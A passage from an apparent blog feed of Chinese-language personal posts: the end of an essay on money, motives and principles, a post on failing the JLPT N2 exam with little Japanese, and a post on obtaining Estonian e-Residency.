萬左右，所以這數字應該滿準的。</p><p>就算考慮到通膨好了，以一年 3% 來算，5 年之後需要的支出大約會多 16%，而這五年間加薪的幅度要超過通膨，我想是沒什麼問題的。</p><p>「不用繼續努力就可以維持這樣的生活」，這個論證之所以成立，是需要兩個假設的。第一個是收入不會變少，第二個是支出也不會變多。</p><p>在一兩年前左右，我對這個論證滿有信心的，但現在不太一樣了。</p><h2 id="收入以及支出的轉變"><a href="#收入以及支出的轉變" class="headerlink" title="收入以及支出的轉變"></a>收入以及支出的轉變</h2><p>先講支出的部分，由於保險費有算在裡面，直接平均分攤掉各種重大疾病的大筆支出，所以基本上應該不太會變動。除非是原生家庭的經濟出了什麼狀況，那就另當別論了。</p><p>而收入的話，我認為以我的能力在台灣要找個月薪 10 萬的工作並不會太難，而且這已經是考慮到緩慢成長以及降薪的情況了。假設我前一份工作月薪是 15 萬好了，然後因為不想進步，每年薪水穩定少 5%，需要到第 8 年，我的薪水才會調降至 10 萬，變成原先設定的低標。</p><p>這些假設看起來很美好，但這一兩年間發生了一些事情，讓支出跟收入的假設似乎都不再成立。</p><p>支出的部分，我在 2022 年結婚了，在太太有工作的情況下倒是還好，但如果沒有的話，支出變成 1.5 倍左右了（目前沒有考慮要生小孩，這倒是不用擔心），因此前面的花費需要重新計算。</p><p>收入的部分，我認為 LLM 的出現改變了「緩慢成長薪水不會降太多」的這個前提，在大 AI 時代的洪流之下，確實很多工具能夠大幅提高生產力，如果沒有跟上這波潮流，被淘汰的速度會快很多。像 AI 這種革命性技術的成熟，確實會改變不少東西，而且淘汰掉那些沒辦法跟上時代的人。</p><p>我這邊指的並不是 AI 可以直接取代工程師，而是「與 AI 協作」這個技能會變成新的工程師必備技能，並且大幅影響日常的工作效率。畢竟有些東西用 AI 來寫就是快很多，在同樣的時間下，可以完成更多工作。那當然勢必要去花時間學習如何與 AI 溝通，如何更好地使用 AI。</p><p>舉個例子好了，以前某項新的技術出來，就算晚個幾年再學可能也沒關係，但比如說像 2022 年底誕生的 ChatGPT，到現在也才過快兩年，有在用的人跟沒在用的人，在處理某些事情的效率上就會差滿多的。再次強調我不是說 AI 萬能，而是說在某些特定情境下，AI 的效率可能是自己做的 10 倍，而且這些情境正在慢慢增加。</p><p>一年前我覺得 AI 陪伴我寫 code 這件事還太早，AI 太菜了，根本看不懂整個 codebase，只會干擾我寫 code 的速度。但一年後 AI 已經進化到可以讓我一直 tab 自動補完，有些時候可以精準預測我的意圖。雖然還沒有到這麼完美，但比一年前進步很多了。</p><p>除了這些之外，我發現自己對金錢可能也不是這麼的佛系。我不確定是不是受到環境的影響，但無論是朋友、同事、家人還是這整個大環境，所談論的話題似乎都離不開錢，而賺錢不是首要興趣的我，感覺自己好像成了異類，沒辦法融入這個環境，開始懷疑起是不是自己哪裡有問題。</p><p>很多人工作都「只是」為了賺錢，但我是真心喜歡我的工作，我喜歡寫程式，也喜歡做滲透測試，喜歡解決工作上碰到的各種問題，這些同時是興趣又是工作，而又剛好可以賺錢。</p><p>另一方面，當看見其他人賺取更多金錢時，我是會羨慕的。那會羨慕，是不是就代表其實是想要的？例如說我不會羨慕別人遊戲打得很好，因為我沒這麼想要，但卻會羨慕別人股市殺進殺出爆賺一波，因為我也想變成那樣子。察覺到這件事情以後，我也不確定自己對於金錢的看法到底是怎樣了。</p><h2 id="賺錢的惰性以及潔癖"><a href="#賺錢的惰性以及潔癖" class="headerlink" title="賺錢的惰性以及潔癖"></a>賺錢的惰性以及潔癖</h2><p>我對於賺錢的惰性應該來自於我前面提的假設，因為不需要刻意額外努力賺錢就能過生活，所以自然也不會理，這就是惰性。如果要用一個詞來闡釋我的中心思想，大概就是懶惰兩字。</p><p>我想活得健康嗎？想啊！那為什麼不去運動？懶啊！</p><p>只要沒有真的立即性的風險，儘管我可能有預知到，我就是懶得行動。比如說剛前面講說支出跟收入的轉變，讓我的假設在未來可能不再成立，但我現在有做出什麼行動嗎？沒有，我就在這邊寫寫廢文講講而已。</p><p>大概就是那種「不見棺材不掉淚」的類型吧？再舉個例子，我有顆智齒因為在比較裡面，所以那邊的牙肉偶爾會發炎，基本上只要每天用漱口水就沒事了，但我也沒有每天用，因為就是懶啊！只有意識到快要發炎或已經發炎的時候，才會乖乖用漱口水，牙肉恢復以後就惰性也跟著一起恢復了。</p><p>我已經清楚地認識到了自己的這個特質，但沒有辦法改變（或許是因為我也不覺得需要改變？）。</p><p>再者，對於賺錢這件事，對我來說優先順序並不是放在第一位的，有些原則更甚於賺錢。舉個例子，如果現在我每篇部落格只要放進付費牆，就能收入一萬台幣，我也是不會放的。</p><p>因為我更在乎放進付費牆犧牲的使用者體驗，勝過於那一萬塊。</p><p>那如果改成每篇十萬我會放嗎？會啊，十萬很多欸。這樣講起來，好像不能說「原則更甚於賺錢」，因為在錢夠多的情況下，這些原則是可以被放棄的，或許改叫「偏好」比較好？如果賺的錢沒有大過一個閾值，我是不會做的。</p><p>不過，我認為當這個閾值超過一般人的範圍時，或許也可以稱作是一種原則。例如說每篇一萬塊可能已經 90% 的人會接受了，此時不接受的我，就可以稱作「原則更甚於賺錢」。</p><p>對我來說，我希望錢能賺的心安理得，而我的心安理得想做到的是，讓別人沒話說的那種。這就是為什麼我的線上課程會提供 30 天內無條件退費的選項，而之前的 bootcamp 也同樣有這種類似的無條件退費的規則，因為我真心抱持著「你覺得花冤枉錢的話，是我的問題，真的喜歡我的課程再付錢吧」這種想法。</p><p>而這個又可以引出另外一個困擾我已久的問題，那就是「動機是重要的嗎？」</p><h2 id="動機與結果"><a href="#動機與結果" class="headerlink" title="動機與結果"></a>動機與結果</h2><p>有些人只是為了想分享技術所以才寫部落格，而有些人則是覺得技術部落格對自己的職涯有幫助，因此才寫起了部落格，這兩者的動機很明顯是不同的。又或是有些人開線上課程，是真心想要傳授知識，但有些人只是看這個產業好像很好賺，想要進去撈一筆而已。</p><p>老實說，我不喜歡「不純的動機」，不純指的是利益至上，就是上面舉的例子那樣，我不喜歡看起來就是來撈一筆的線上課程。</p><p>但是，為什麼呢？為什麼我不喜歡？</p><p>我有認真思考過這個問題，但我還沒想出明確的答案。或許是因為我覺得這件事情不該是這樣的。教學跟分享應該是目的本身，而不是被作為手段來使用，想分享就是想分享，並不是為了得到什麼利益。</p><p>如果是為了利益的話，動機就不純了。而我自己是屬於「分享即目的」的那派，或許這也是為什麼我會不喜歡不純的動機，有種「你褻瀆了我真心喜愛的事物」的感覺。</p><p>可是話又說回來，動機不純，不代表結果不好，也不代表為社會帶來的利益是負的（還有另一個問題是，該怎麼知道對方動機真的不純？但這邊先假設這件事情是成立的）。</p><p>舉例來說，假設有個人只是想要賺一筆而開了線上課程，對教學根本沒興趣，動機不純，但是上過課的學生每一個都說讚，覺得課程教得真好，收穫良多，那我又該如何評斷這種行為？</p><p>站在理性的角度上來思考，很顯然結果是好的，是應該鼓勵的，但這同時也代表了我的「討厭不純的動機」只是無理取鬧而已。這就呼應我上一段所說的：「動機是重要的嗎？」，是動機重要，還是結果比較重要？</p><p>想到這裡的時候其實我想到了倫理學中的經典議題：電車問題，透過思想實驗來測試背後的價值觀，有很多變形的版本，但我有印象的版本是拉了轉轍器之後火車會改變軌道，撞死在那邊遊玩的五個人；不拉的話火車上的人都會死。</p><p>你是會以人數至上，為了一整車的人而犧牲五個人，還是以「那五個人是無辜的」為理由，拯救那五個人？這類的道德選擇在電影裡面也時常出現，例如說要讓飛彈中途被打掉，但掉到其他小城市，還是讓飛彈往大城市飛去，引爆而死更多人。</p><p>再舉一個我自己覺得衝突的例子，這邊的衝突指的是「雖然我不喜歡，但我又能一定程度上認同這是對其他人有益的」。</p><p>像是有些人會不斷寫一些知識類相關的貼文，我可以認同這對其他人是有益的，因為他們可以從中學到一些知識，這沒問題。</p><p>但是除了分享知識以外，每一則貼文同時也在宣傳自己的課程或是其他付費內容，不知道為什麼，我看了就是不喜歡。這個想法其實很久了，但我以前之所以沒有講過，是因為我不認為這是一件對的事情。我是說，我不覺得「我看了不喜歡」是對的。</p><p>這是一個理性跟感性的衝突，我一方面看到就是心情不好不爽，另一方面卻又覺得「我這樣是不對的，不爽是不對的」，但我找不到平衡點。通常在我整理好自己的想法之前，我是不會對外發表的，尤其是這種我認為自己是不對的的想法，那為什麼現在又會寫出來呢？是因為我覺得寫出來，對於找到答案或許是有幫助的。</p><h2 id="奢侈的煩惱"><a href="#奢侈的煩惱" class="headerlink" title="奢侈的煩惱"></a>奢侈的煩惱</h2><p>轉個念頭，有天我心裡在想一件事，會不會這些煩惱都太…奢侈了？</p><p>為什麼其他人都這麼汲汲營營在賺錢，或許是因為他們不賺錢就生活不下去，生存是本能，因此根本不需要思考賺錢的意義。</p><p>為什麼有這麼多人以利益為動機去做各種事？因為他們需要那些紅利。</p><p>而我，薪水是夠的，不需要特別額外做什麼就可以生存下去，又透過部落格累積了一些名氣，享受到了紅利，卻反過來質疑那些為了紅利而寫作的人，是不是一種偽善，是不是一種「不食人間煙火」？</p><h2 id="搖擺的定位"><a href="#搖擺的定位" class="headerlink" title="搖擺的定位"></a>搖擺的定位</h2><p>我理性上可以接受追求金錢是有其道理的，但感性上又認為我沒必要刻意去追求更多金錢，於是就在這兩者之間不斷搖擺，找不到一個答案。這件事讓我非常困擾，原因是我覺得自己 30 歲了，需要明確的選擇一個立場才能繼續生活下去，不想再搖擺了。</p><p>之前無意間在臉書上看到一篇囧星人的貼文，標題是：<a href="https://www.facebook.com/kyontw828/posts/pfbid0S3WBaMMaipNPALyj3wpUAw2J4Mn311NVaZxX2joPzbFvh82vJQZjWdZaKoTBapzbl?__cft__%5B0%5D=AZWJSMNqPytDw2QGQyjdIczS6_BO2nXkRchPgkISlX1rD47n0iCxjMK3yUnXNe6P2llYRALY36BOHj5pbv775pW41vl4gk4DY6DrpUfZg4LlyA7_IOUHn27hKyn3vrtEGxXcDptZZ34var-0FOwYnt3d&__tn__=,O,P-R">【如果你認為自己是個好人，應該讓自己變得有錢。】</a>，其實有部分內容與我自己最近的一些體悟類似，這篇貼文的大意是：「錢到好人手中可以成就更多好事，因此如果你覺得自己是好人，應該變得更有錢」</p><p>當然不是說沒錢就不能做善事，而是我們都應該同意，你變得更有錢之後，可以做的事情會更多，造福的人群也會更多。</p><p>對我來說，我面臨的問題是：「如果有兩種手段可以達成我的目的，A 速度慢但是不違背其他理念，B 速度快但是違背理念，應該要選哪一種？」</p><p>更具體的問題是，假設我的目的是「獲得財富以後用教學造福更多人」，那 A 就是慢慢賺錢，一樣賣著便宜的課程，然後把錢投入在教學上面。B 的話就是把課程賣貴一點，就能早點獲得財富，並產出更多品質更好的課程。</p><p>但 B 之所以違背理念，是因為我對課程的定價是有個原則在的，而且這個價格是低於市場的。例如說市場上普遍是 3000 塊台幣好了，我的原則可能讓我覺得 1500 台幣就差不多了，再賣貴一點就違背了我的原則，這個原則可能是：「課程不應該賣這麼貴」。</p><p>假設選 A 需要 10 年才能達成目標，選 B 可能只要 5 年，速度快了一倍，那我到底應該選 A 還是選 B？到底這個目標有多重要，會需要犧牲多少東西去達成？</p><p>在想這個問題時，我想到了《人選之人》裡面的橋段，如果你表達自己的立場明確反對死刑，就會流失選票，導致最後選不上總統；但如果沒有表態，就是辜負了那些為了這個議題支持你的選民，違背了自己的原則，那到底是應該為了「貫徹自我」，明確表態，還是為了達成最終目標，所以隱瞞立場？</p><p>我也想到了《八尺門的辯護人》裡面做出的選擇，有些人為了目的可以不擇手段，甚至違背原則，只要最終的目的有達成就好。同樣是死刑問題，反對死刑的法務部長，卻利用死刑這件事刻意造成誤判，藉此來強調死刑會有的問題，試圖讓大眾往反對死刑的立場靠攏。</p><p>再舉個例子，假設有個希望「世界和平，沒有戰爭」的人，實際做法是發起戰爭，把所有異議份子都殺了，只留下支持這個理念的人，藉此來達成世界和平的目標。這就是為了目標而違背原則，但或許可以更快達成目標的做法（當然，這種做法能不能達成目標又是另一個可以討論的點了）。</p><p>我目前困擾的點應該在於，雖然 A 跟 B 像是一種選擇，但會不會其實不是，其實只有 B 可以達成目標，A 是天真，是太理想化，是不食人間煙火？</p><p>會這樣講是因為，我目前理性上是偏向 B 的，亦即我認同如果想要趕快達成目標，是必須犧牲一些東西，儘管這必須違背自己的原則。但我感性上卻是 A，我不想違背自己的原則，就算這會讓我沒辦法達成目標。</p><p>而這樣的衝突就讓我很不舒服，就是一種「我明知這樣是不對的（因為理性這樣告訴我），但我還是想這樣做（因為我就是想這樣）」的感覺，我不喜歡這種感覺。</p><h2 id="我是誰？想成為怎樣的人？想做什麼？"><a href="#我是誰？想成為怎樣的人？想做什麼？" class="headerlink" title="我是誰？想成為怎樣的人？想做什麼？"></a>我是誰？想成為怎樣的人？想做什麼？</h2><p>每次在思考上面這些問題的時候，我最後都會歸咎於：「這是因為我沒有明確的中心思想，我不知道我想成為誰，想做什麼」而造成的，彷彿這個問題有了答案之後，所有其他問題都能迎刃而解。</p><p>但我從來都沒有想清楚過這題，因此我也不知道是不是真的有這個萬靈丹，能夠把其他問題一起解決。</p><p>我大概知道我喜歡做哪些事情，不喜歡做哪些事情，但如果你問我是個怎樣的人，人生有沒有什麼目標，我只能說：「窩不知道」。</p><h2 id="小結"><a href="#小結" class="headerlink" title="小結"></a>小結</h2><p>這篇在談的問題，應該可以濃縮成以下幾點：</p><ol><li>對金錢的看法，我認為自己沒這麼在意錢，但為什麼我看到其他人賺大錢我會羨慕？是不是我其實很在意？該怎麼解釋這個行為？</li><li>我不喜歡「不純的動機」，這是為什麼？我的理論站得住腳嗎？有沒有除了「我不喜歡」之外的合理解釋，是可以說服別人「你也應該不喜歡」的？沒有的話，那我該怎麼辦？接受我就是個雞掰人嗎？</li><li>假設 AB 手段都可以達成目標，B 快很多但是會違背原則，有沒有一個理論可以說服我自己 A 或 B 一定是對的？我目前邏輯推理出來是偏向 B，但我還是想選 A，我該如何解釋這種不一致？</li><li>我想成為怎樣的人，想做什麼？</li></ol><p>這篇文章從 2023 年就開始寫了，但一直寫到 2024 還是寫不完，畢竟你也看得到，上面的文章提出了一堆問題，卻沒有提出解答。不過在思考了一陣子之後，有些問題我有了答案，就留到之後再分享吧。</p><p>其實原本這篇是想等到我把所有問題想清楚再發的，但拖一陣子之後覺得可能沒有那麼快，還是先發吧，發了之後或許會有更多新的想法。</p><p>我從 2023 年中拖到 2024 年初，本來想說二三月好像可以發，但想說再想想。接著拖到六七月開始繼續思考人生，想著想著生活就被其他事情塞滿了，又開始忙碌了起來，一直到現在才又有點時間回來思考，想說趕快發吧。</p>]]></content>
      
      
      <categories>
          
          <category> 思考人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不會日文去考 JLPT 日檢 N2 可以得幾分？</title>
      <link href="/2024/08/29/jlpt-n2-failed/"/>
      <url>/2024/08/29/jlpt-n2-failed/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/jlpt-n2-failed/p1.jpg" alt="買的書，但全部沒看"></p><p>來日本生活九個月以後，在今年七月考了日檢，由於考日檢的目的是高度人才加分，因此 N2 以下都不考慮，所以在不會什麼日文的狀況下直接報了個 N2，想說碰碰運氣，順便想實測一下能猜到多少分。</p><p>大概講一下我的日文程度大概到哪邊：</p><ol><li>五十音看得懂，但有些很像的還是要想一下</li><li>很常分不清楚有沒有濁音</li><li>日常生活會用到的日文只有買東西的時候一直說：「大丈夫です」（不用塑膠袋、不用會員卡等等）以及「レシート大丈夫です」，不用收據。</li><li>基本上不會文法也不會什麼單字，「我住在日本」不會說，因為我不知道「住」怎麼講，連接詞也不知道用什麼，更別提什麼動詞變化了，那是什麼？</li><li>聽力的部分，只有與漢字相似的音可以猜一猜，否則聽不懂</li></ol><p>換句話說，我的日文程度跟沒學過日文但常來日本玩的人差不多，搞不好還更爛一些。</p><p>但畢竟都花錢考試了嘛，所以想說還是來準備一下，因此就買了文章開頭的那些書籍，但最後全部都沒看。</p><p>很多人以為我在自我介紹裡面寫的「生活上是重度拖延症患者，有很多想做的事，卻幾乎都沒有執行」只是隨便寫寫的，沒有，那是千真萬確的，真的全部都沒看，有些書我連打開都沒打開來過。我也曾經想透過其他管道例如說 YouTube 學習，覺得 Yuta 老師的日本語教室還滿不錯的，但看到第三課就沒看了，第三課教的大概是這些：</p><p><img src="/img/jlpt-n2-failed/p2.png" alt="買的書，但全部沒看"></p><p>介紹完背景之後，先直接公佈成績好了：</p><ul><li>言語知識 25 &#x2F; 60</li><li>讀解 23 &#x2F; 60</li><li>聽力 19 &#x2F; 60</li><li>總分 67 &#x2F; 180</li></ul><p><img src="/img/jlpt-n2-failed/p3.png" alt="日檢成績"></p><p>及格線是 90 分，所以還差得很遠。</p><p>前面閱讀的部分因為有漢字，還可以大概猜一下意思，我還是有認真考的，試著透過漢字去猜題目在寫什麼，不過只看得懂漢字顯然是不太夠的。而聽力的部分我原本想說應該聽得懂一點吧，結果發現全部都聽不懂，因此最後是直接用猜的，比想像中還慘不忍睹。</p><p>大概就是這樣，然後今天也剛報完了年底的日檢，希望這段時間我會乖乖唸書。</p>]]></content>
      
      
      <categories>
          
          <category> 日本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>愛沙尼亞數位居民申請心得</title>
      <link href="/2024/08/12/become-an-estonia-e-resident/"/>
      <url>/2024/08/12/become-an-estonia-e-resident/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/become-an-estonia-e-resident/p1-home.png" alt="愛沙尼亞數位居民網站"></p><p>大約半年前左右，跟朋友聊天時無意間得知有「愛沙尼亞數位居民」這個酷東西，正式名稱為「e-Residency of Estonia」，任何人都可以申請，通過之後可以拿到一個讀卡機跟數位身分證，接著就可以直接在網路上在愛沙尼亞開公司以及開戶。</p><p>但數位居民終究只存在於數位，這並不是合法的愛沙尼亞公民，也沒有什麼永久居留權，連簽證都算不上，在實體的世界中，有沒有 e-Residency 應該是沒有差別的。</p><p>那為什麼我想申請這個？申請這個又能幹嘛呢？</p><h2 id="辦這個可以幹嘛？"><a href="#辦這個可以幹嘛？" class="headerlink" title="辦這個可以幹嘛？"></a>辦這個可以幹嘛？</h2><p>聽到這個酷東西之後，先上網稍微研究了一下，網路上的中文參考資源不多，基本上就那幾個：</p><ol><li><a href="https://medium.com/%E7%88%B1%E6%B2%99%E5%B0%BC%E4%BA%9A%E7%94%B5%E5%AD%90%E5%85%AC%E6%B0%91%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/%E7%88%B1%E6%B2%99%E5%B0%BC%E4%BA%9A%E7%94%B5%E5%AD%90%E5%85%AC%E6%B0%91%E8%AE%A1%E5%88%92%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97-%E9%9B%B6-8b0eba8b2b96">爱沙尼亚电子公民计划不完全指南·零</a> (2018)</li><li><a href="https://yichuncheng.medium.com/%E5%8D%81%E5%88%86%E9%90%98%E6%88%90%E7%82%BA%E6%84%9B%E6%B2%99%E5%B0%BC%E4%BA%9E%E6%95%B8%E4%BD%8D%E5%85%AC%E6%B0%91-9fb3f194a194">十分鐘成為愛沙尼亞數位公民</a> (2019)</li><li><a href="https://theinitium.com/article/20230112-international-chinese-estonia-e-id">愛沙尼亞的中國「數字居民」：通往新身份之路</a> (2023)</li></ol><p>不過我在寫這篇之前還有找到一個資源超豐富的網站：<a href="https://rososa.com/">爱沙尼亚电子居民社区</a>，裡面很多資源，滿推薦這個的。話說這網站有特別寫一篇<a href="https://rososa.com/e-residency-faq/">电子居民常见问题汇总</a>，裡面有提到：</p><blockquote><p>虽然有时候你会在网络上看到“电子公民”这个词，但是答案是：没有“电子公民”这个东西，它其实是“电子居民”。从词语的具体含义和法律含义来说，“公民”与“居民”虽一字之隔，但是有着巨大的差别，过去在互联网上有很多网站和博主使用过“电子公民”一词，在不严谨的情形下，很多网友将“电子居民”与“电子公民”混用。本站(rososa.com)也与爱沙尼亚电子居民办公室做过沟通和确认，中文应为“电子居民”。所以也推荐大家本着避免误会，和传达准确意义的角度，统一使用正确的称呼：“电子居民”</p></blockquote><p>聽起來滿有道理的，因此這篇標題才會是「數位居民」而非「數位公民」。</p><p>總之呢，研究完一輪之後，發現跟我理解的差不多，成為數位公民之後，在網路以外的世界是沒有任何差異的，你入境愛沙尼亞也不會走特別通道，原本需要簽證的話現在還是需要。</p><p>因此，所謂的愛沙尼亞數位居民，說穿了就是「住在愛沙尼亞數位世界的人」。</p><h2 id="愛沙尼亞數位世界"><a href="#愛沙尼亞數位世界" class="headerlink" title="愛沙尼亞數位世界"></a>愛沙尼亞數位世界</h2><p>如果你說在台灣有個台灣版的數位公民，發給你一個自然人憑證然後可以使用網路上的服務，這可能沒什麼大不了的，因為大多數服務可能還是需要你跑一趟實體的據點，或者是蓋章之類的。如果想要開公司的話，一樣要去跑大地遊戲。</p><p>但愛沙尼亞就不同了，他們什麼都可以在線上辦，甚至連投票也可以。</p><p>國家發展委員會資訊管理處的<a href="https://ws.ndc.gov.tw/Download.ashx?u=LzAwMS9hZG1pbmlzdHJhdG9yLzEwL3JlbGZpbGUvMC8xMTM5Mi9iY2JiYzk5NC02NTA3LTQzMDAtODViYy0yMTkwM2JhMTM5NDgucGRm&n=5pW45L2N5rK75ZyL55qE5oSb5rKZ5bC85Lqe77yM5pW45L2N5YWs5rCR542o5q2l5YWo55CDLnBkZg==&icon=..pdf">數位治國的愛沙尼亞，數位公民獨步全球</a>一文中有提到：</p><blockquote><p>根據愛沙尼亞官方統計，在愛沙尼亞有 99%的銀行轉帳通過數位平臺進行，95%的納稅人在網上申報所得，98%的藥物以數位方式提供處方，66%的人口曾參加線上人口普查，98%的愛沙尼亞人皆使用數位身份證，由此可知，愛沙尼亞民眾數位化程度也相當高，幾乎所有大小事都能在線上完成。根據世界銀行 2016 年的報告統計，愛沙尼亞已經有超過 3 千多個政府和銀行的服務可以透過網路提供：透過網路，可以在 20 分鐘內成立 1 間公司；不需要透過會計師，在 5 分鐘內即可申報收入</p></blockquote><p>還真的什麼都可以在網路上搞定，非常方便。</p><p>想知道更多的話可以參考 2021 年報導者的文章：<a href="https://www.twreporter.org/a/e-id-in-estonia">連「政府」都備份好了！愛沙尼亞如何打造世界最成功的數位社會？</a>。</p><p>有不少人想成為愛沙尼亞數位居民，都是因為透過這個身份，可以在愛沙尼亞，也就是歐盟裡面開一間公司，如果想做那邊的生意的話，是一個非常方便的管道。而這也是數位居民的主要目的，官方網站的標題已經告訴你了：</p><blockquote><p>e-Residency of Estonia | Apply &amp; start an EU company online</p></blockquote><p><img src="/img/become-an-estonia-e-resident/p2-search.png" alt="官方網頁標題"></p><p>那如果不需要開公司的話，申請這個數位居民可以幹嘛？</p><p>似乎還真的不能幹嘛，因為開戶的話如果是以個人的身份，應該還是開不了（或是很困難，這部分我沒有深入研究），但我的話覺得倒是沒什麼關係，更多是出自於有趣，覺得「哇，愛沙尼亞數位居民欸，這聽起來就超酷的啦」。</p><h2 id="申請歷程"><a href="#申請歷程" class="headerlink" title="申請歷程"></a>申請歷程</h2><p>更多介紹以及申請連結都在官網上面：<a href="https://www.e-resident.gov.ee/">https://www.e-resident.gov.ee/</a></p><p>基本上整個流程就是：</p><ol><li>填資料申請</li><li>等待結果</li><li>通過</li><li>等待寄送 ID card，只能去愛沙尼亞大使館領（我選東京的）</li><li>去大使館領取 ID card</li><li>完成</li></ol><p>申請的部分，反正就資料填一填，但要填的東西還不少，包括：</p><ol><li>申請理由</li><li>個人聯絡資訊</li><li>護照</li><li>證件照</li><li>社群媒體帳號</li><li>履歷（來看你的學歷跟經歷）</li><li>（還有一些但我懶得寫）</li></ol><p>我不確定是不是每樣都是必須的（例如說社群媒體帳號），但我是都有給就是了。另外，最後送出申請時需要支付 120 歐元的手續費，折合台幣約 4300 塊。</p><p>送出之後，就會收到一封 email 說已經成功送出申請，接著就是等結果了。</p><p>我是 5&#x2F;19 的時候送出申請的，5&#x2F;29 收到通過的信件，話說信件上面寫的是「Your application for the e-resident’s digital ID has received a positive decision」，「positive decision」，學到了新的用法。</p><p><img src="/img/become-an-estonia-e-resident/p3-positive.png" alt="通過的信件"></p><p>通過之後就會開始製作我的 ID card 然後寄到我選的東京大使館，要等寄到之後才能去領。等了一個多月，終於在 6&#x2F;27 收到信件，通知說我的 ID card 寄到了。</p><p>信裡會有一個預約連結，點左上角的國旗可以選語言：</p><p><img src="/img/become-an-estonia-e-resident/p4-booking.png" alt="預約的網站"></p><p>如果人在台灣的話，來東京玩的時候可以順便約時間去拿，但並不是每個時段都可以，目前（2024 年 8 月）只有每週一跟三的早上可以預約而已，其他時間是不行的。</p><h2 id="領取證件"><a href="#領取證件" class="headerlink" title="領取證件"></a>領取證件</h2><p>愛沙尼亞駐東京大使館在一個滿尷尬的位置，離周遭的每一個地鐵站都不算近：</p><p><img src="/img/become-an-estonia-e-resident/p5-map.png" alt="愛沙尼亞駐東京大使館地理位置圖"></p><p>我是搭到北參道之後走過去的，路程大約是 15 分鐘。強烈建議不要在夏天做這種事，你大概有 80% 的機率會後悔，因為超級熱，而且沿途沒什麼遮蔽物，就沿路曬曬曬一直曬到大使館。比較好的做法可能是找個更近的地鐵站（外苑前）、搭公車或是搭計程車，否則太陽真的太可怕。</p><p>不確定那邊能不能拍照，但是 <a href="https://maps.app.goo.gl/1WJKqP6xXytrYbwJA">Google Maps</a> 上面有一些照片可以看，就是一個小小的建築物，到門口之後需要按對講機告知身份才能進去。</p><p>進去之後確實如我朋友所說，還滿漂亮的，第一次看到大使館，原來是這種感覺。</p><p>然後就會有人來處理一些手續，會簽一份文件跟按指紋，整個流程大約 15 分鐘，大部分時間都在等，中間也沒聊什麼。總之呢，最後就會拿到證件外加讀卡機，還有一份使用說明（讀卡機在裡面）：</p><p><img src="/img/become-an-estonia-e-resident/p6-id.jpg" alt="拿到的證件"></p><h2 id="進入愛沙尼亞數位世界"><a href="#進入愛沙尼亞數位世界" class="headerlink" title="進入愛沙尼亞數位世界"></a>進入愛沙尼亞數位世界</h2><p>在開始之前，需要做一些前置準備。</p><p>在電腦上要安裝一個叫 DigiDoc 的軟體，接上讀卡機以後可以用這個軟體簽署電子文件，也能看到自己的個人資料：</p><p><img src="/img/become-an-estonia-e-resident/p7-sig.png" alt="DigiDoc"></p><p>再來的話還要裝瀏覽器的擴充套件，裝完之後就可以登入愛沙尼亞的網站，查看有哪些服務可以使用：</p><p><img src="/img/become-an-estonia-e-resident/p8-portal.png" alt="線上可以使用的服務"></p><p>跟之前查得差不多，基本上什麼都可以在上面完成，全部都整合在同一個入口裡面，滿方便的。而且剛剛提到的 DigiDoc 跟這個網站，應該都是他們自己的公民就會使用的服務，是同一套系統，而不是只為了數位居民而建的。</p><p>話說我拿到證件之後才發現原來這個數位居民不是永久的，效期是五年，快到五年的時候需要更新，更新的時候要再付 120 歐元左右的更新費用，底下是 dashboard 的截圖：</p><p><img src="/img/become-an-estonia-e-resident/p9-docs.png" alt="dashboard 的截圖"></p><p>還有另一件事情是官方的文件有提到成為數位居民之後，會拿到一個 @eesti.ee 的 email 地址，所有官方的通知都會寄到這個地址去，但因為它並沒有一個真的 email client 讓你登入，所以需要去網站上設定 email forwarding，轉到自己在用的其他信箱去。</p><p>我試了一下，這句話讓我以為我會有一個「<a href="mailto:&#120;&#x78;&#x78;&#x40;&#101;&#x65;&#115;&#x74;&#105;&#46;&#101;&#x65;">&#120;&#x78;&#x78;&#x40;&#101;&#x65;&#115;&#x74;&#105;&#46;&#101;&#x65;</a>」的 email 可以用，所有寄到這邊來的，都會轉到我設定好的信箱去。</p><p>不過我在哪都找不到這個 xxx 是什麼，最後好不容易才搜尋到這個公告：<a href="https://www.eesti.ee/en/news/email-addresses-using-names-and-ending-in-eestiee-are-closed-as-of-today">Email addresses using names and ending in @eesti.ee are closed as of today</a>，看起來那個 xxx 是 personal identification code，類似身分證字號的東西。</p><p>嘗試寄到我的地址之後，直接噴了一個錯誤訊息是不允許某個 IP 發送到這個位置，看來就只能收來自官方的信件而已，沒辦法做為私人用途。</p><p>這樣講起來根本也不用知道什麼 @eesti.ee，從頭到尾就只是能設定一個 email address，讓官方把通知信件寄給你，僅此而已，否則多一個 @eesti.ee 的信箱感覺挺帥的。</p><h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>以上就是我申請愛沙尼亞數位居民的歷程，目前得到的結論是：「如果沒有想在愛沙尼亞開公司，申請這個沒有其他實際用途」。</p><p>因此，下一步我就要來研究怎麼在那邊開個公司了。</p><p>原本其實是想寫在同一篇的，但我想得太天真了，因為有不少東西需要研究。最簡單的方案就是找個一條龍的線上服務，從開公司到提供會計服務全部搞定，類似於台灣的 <a href="https://simpany.co/">Simpany</a>，但一個月需要 60 歐元（大部分都是會計用途），一年就是 25,000 台幣左右，如果我這個公司也是沒什麼在運作的（整年搞不好三四筆紀錄而已），那成本有點太高了。</p><p>這些開發票、申報以及記帳的東西，如果不複雜的話其實可以考慮自己來（法規允許的話），也可以分開找不同的線上服務花錢處理，看有沒有更簡單的方式。</p><p>綜合以上所述，開公司以及事前研究的部分還在進行中，因此之後會再寫一篇，只是不知道要多久就是了（正大光明的拖稿預告）。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.5 本書的誕生——《Beyond XSS：探索網頁前端資安宇宙》的幕後故事</title>
      <link href="/2024/07/10/the-story-behind-my-xss-book/"/>
      <url>/2024/07/10/the-story-behind-my-xss-book/</url>
      
